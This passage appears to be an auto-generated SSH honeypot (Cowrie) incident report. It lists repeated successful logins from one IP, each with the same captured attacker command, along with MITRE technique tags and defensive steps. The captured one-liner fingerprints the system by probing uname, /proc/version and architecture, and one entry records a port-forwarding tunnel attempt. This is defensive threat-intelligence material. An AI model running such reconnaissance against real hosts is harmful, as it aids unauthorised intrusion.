| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 04:27:59` | `cowrie.session.connect` |
| `2026-09-06 04:28:00` | `cowrie.client.version` |
| `2026-09-06 04:28:00` | `cowrie.client.kex` |
| `2026-09-06 04:28:01` | `cowrie.login.success` |
| `2026-09-06 04:28:02` | `cowrie.session.params` |
| `2026-09-06 04:28:02` | `cowrie.command.input` |
| `2026-09-06 04:28:04` | `cowrie.log.closed` |
| `2026-09-06 04:28:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a137db84fea5

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-06 04:29 |
| **Last Seen** | 2026-09-06 04:29 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 04:29:54` | `cowrie.session.connect` |
| `2026-09-06 04:29:54` | `cowrie.client.version` |
| `2026-09-06 04:29:54` | `cowrie.client.kex` |
| `2026-09-06 04:29:55` | `cowrie.login.success` |
| `2026-09-06 04:29:56` | `cowrie.session.params` |
| `2026-09-06 04:29:56` | `cowrie.command.input` |
| `2026-09-06 04:29:57` | `cowrie.log.closed` |
| `2026-09-06 04:29:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a3d0066ce3c3

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-06 04:31 |
| **Last Seen** | 2026-09-06 04:31 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 04:31:48` | `cowrie.session.connect` |
| `2026-09-06 04:31:48` | `cowrie.client.version` |
| `2026-09-06 04:31:48` | `cowrie.client.kex` |
| `2026-09-06 04:31:50` | `cowrie.login.success` |
| `2026-09-06 04:31:51` | `cowrie.session.params` |
| `2026-09-06 04:31:51` | `cowrie.command.input` |
| `2026-09-06 04:31:52` | `cowrie.log.closed` |
| `2026-09-06 04:31:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e7f4304c1d41

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-06 04:33 |
| **Last Seen** | 2026-09-06 04:33 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 04:33:37` | `cowrie.session.connect` |
| `2026-09-06 04:33:38` | `cowrie.client.version` |
| `2026-09-06 04:33:38` | `cowrie.client.kex` |
| `2026-09-06 04:33:39` | `cowrie.login.success` |
| `2026-09-06 04:33:40` | `cowrie.session.params` |
| `2026-09-06 04:33:40` | `cowrie.command.input` |
| `2026-09-06 04:33:41` | `cowrie.log.closed` |
| `2026-09-06 04:33:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f3331b3fac16

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-06 04:35 |
| **Last Seen** | 2026-09-06 04:35 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 04:35:30` | `cowrie.session.connect` |
| `2026-09-06 04:35:30` | `cowrie.client.version` |
| `2026-09-06 04:35:30` | `cowrie.client.kex` |
| `2026-09-06 04:35:31` | `cowrie.login.success` |
| `2026-09-06 04:35:32` | `cowrie.session.params` |
| `2026-09-06 04:35:32` | `cowrie.command.input` |
| `2026-09-06 04:35:32` | `cowrie.log.closed` |
| `2026-09-06 04:35:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f3b430a915a2

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-06 04:37 |
| **Last Seen** | 2026-09-06 04:37 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 04:37:25` | `cowrie.session.connect` |
| `2026-09-06 04:37:25` | `cowrie.client.version` |
| `2026-09-06 04:37:26` | `cowrie.client.kex` |
| `2026-09-06 04:37:26` | `cowrie.login.success` |
| `2026-09-06 04:37:27` | `cowrie.session.params` |
| `2026-09-06 04:37:27` | `cowrie.command.input` |
| `2026-09-06 04:37:28` | `cowrie.log.closed` |
| `2026-09-06 04:37:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-549eebe00b88

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-06 04:39 |
| **Last Seen** | 2026-09-06 04:39 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 04:39:25` | `cowrie.session.connect` |
| `2026-09-06 04:39:25` | `cowrie.client.version` |
| `2026-09-06 04:39:25` | `cowrie.client.kex` |
| `2026-09-06 04:39:26` | `cowrie.login.success` |
| `2026-09-06 04:39:27` | `cowrie.session.params` |
| `2026-09-06 04:39:27` | `cowrie.command.input` |
| `2026-09-06 04:39:27` | `cowrie.log.closed` |
| `2026-09-06 04:39:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d5b8be9602d3

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-06 04:41 |
| **Last Seen** | 2026-09-06 04:41 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 04:41:21` | `cowrie.session.connect` |
| `2026-09-06 04:41:21` | `cowrie.client.version` |
| `2026-09-06 04:41:21` | `cowrie.client.kex` |
| `2026-09-06 04:41:23` | `cowrie.login.success` |
| `2026-09-06 04:41:24` | `cowrie.session.params` |
| `2026-09-06 04:41:24` | `cowrie.command.input` |
| `2026-09-06 04:41:24` | `cowrie.log.closed` |
| `2026-09-06 04:41:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-624685757cc3

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-09-06 04:43 |
| **Last Seen** | 2026-09-06 04:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 04:43:02` | `cowrie.session.connect` |
| `2026-09-06 04:43:02` | `cowrie.client.version` |
| `2026-09-06 04:43:02` | `cowrie.client.kex` |
| `2026-09-06 04:43:03` | `cowrie.login.success` |
| `2026-09-06 04:43:03` | `cowrie.direct-tcpip.request` |
| `2026-09-06 04:43:03` | `cowrie.direct-tcpip.data` |
| `2026-09-06 04:43:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9019e4debaef

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-06 04:43 |
| **Last Seen** | 2026-09-06 04:43 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 04:43:14` | `cowrie.session.connect` |
| `2026-09-06 04:43:14` | `cowrie.client.version` |
| `2026-09-06 04:43:14` | `cowrie.client.kex` |
| `2026-09-06 04:43:17` | `cowrie.login.success` |
| `2026-09-06 04:43:18` | `cowrie.session.params` |
| `2026-09-06 04:43:18` | `cowrie.command.input` |
| `2026-09-06 04:43:19` | `cowrie.log.closed` |
| `2026-09-06 04:43:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42ec8befc4fc

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-06 04:45 |
| **Last Seen** | 2026-09-06 04:45 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 04:45:06` | `cowrie.session.connect` |
| `2026-09-06 04:45:06` | `cowrie.client.version` |
| `2026-09-06 04:45:06` | `cowrie.client.kex` |
| `2026-09-06 04:45:07` | `cowrie.login.success` |
| `2026-09-06 04:45:09` | `cowrie.session.params` |
| `2026-09-06 04:45:09` | `cowrie.command.input` |
| `2026-09-06 04:45:09` | `cowrie.log.closed` |
| `2026-09-06 04:45:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d926ac226b8

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-06 04:46 |
| **Last Seen** | 2026-09-06 04:47 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 04:46:59` | `cowrie.session.connect` |
| `2026-09-06 04:46:59` | `cowrie.client.version` |
| `2026-09-06 04:46:59` | `cowrie.client.kex` |
| `2026-09-06 04:47:00` | `cowrie.login.success` |
| `2026-09-06 04:47:02` | `cowrie.session.params` |
| `2026-09-06 04:47:02` | `cowrie.command.input` |
| `2026-09-06 04:47:03` | `cowrie.log.closed` |
| `2026-09-06 04:47:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ddb41eacf735

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-06 04:48 |
| **Last Seen** | 2026-09-06 04:48 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 04:48:50` | `cowrie.session.connect` |
| `2026-09-06 04:48:50` | `cowrie.client.version` |
| `2026-09-06 04:48:50` | `cowrie.client.kex` |
| `2026-09-06 04:48:52` | `cowrie.login.success` |
| `2026-09-06 04:48:52` | `cowrie.session.params` |
| `2026-09-06 04:48:52` | `cowrie.command.input` |
| `2026-09-06 04:48:53` | `cowrie.log.closed` |
| `2026-09-06 04:48:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-deed23c6eb7b

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-06 04:50 |
| **Last Seen** | 2026-09-06 04:50 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 04:50:41` | `cowrie.session.connect` |
| `2026-09-06 04:50:41` | `cowrie.client.version` |
| `2026-09-06 04:50:41` | `cowrie.client.kex` |
| `2026-09-06 04:50:44` | `cowrie.login.success` |
| `2026-09-06 04:50:45` | `cowrie.session.params` |
| `2026-09-06 04:50:45` | `cowrie.command.input` |
| `2026-09-06 04:50:46` | `cowrie.log.closed` |
| `2026-09-06 04:50:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3400258e6f32

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-06 04:52 |
| **Last Seen** | 2026-09-06 04:52 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 04:52:30` | `cowrie.session.connect` |
| `2026-09-06 04:52:30` | `cowrie.client.version` |
| `2026-09-06 04:52:30` | `cowrie.client.kex` |
| `2026-09-06 04:52:32` | `cowrie.login.success` |
| `2026-09-06 04:52:34` | `cowrie.session.params` |
| `2026-09-06 04:52:34` | `cowrie.command.input` |
| `2026-09-06 04:52:34` | `cowrie.log.closed` |
| `2026-09-06 04:52:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-31487db20606

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-06 04:54 |
| **Last Seen** | 2026-09-06 04:54 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 04:54:19` | `cowrie.session.connect` |
| `2026-09-06 04:54:19` | `cowrie.client.version` |
| `2026-09-06 04:54:19` | `cowrie.client.kex` |
| `2026-09-06 04:54:20` | `cowrie.login.success` |
| `2026-09-06 04:54:22` | `cowrie.session.params` |
| `2026-09-06 04:54:22` | `cowrie.command.input` |
| `2026-09-06 04:54:22` | `cowrie.log.closed` |
| `2026-09-06 04:54:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-173397c052e2

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-06 04:56 |
| **Last Seen** | 2026-09-06 04:56 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 04:56:11` | `cowrie.session.connect` |
| `2026-09-06 04:56:11` | `cowrie.client.version` |
| `2026-09-06 04:56:12` | `cowrie.client.kex` |
| `2026-09-06 04:56:12` | `cowrie.login.success` |
| `2026-09-06 04:56:13` | `cowrie.session.params` |
| `2026-09-06 04:56:13` | `cowrie.command.input` |
| `2026-09-06 04:56:14` | `cowrie.log.closed` |
| `2026-09-06 04:56:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-51935bf3422a

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-06 04:58 |
| **Last Seen** | 2026-09-06 04:58 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
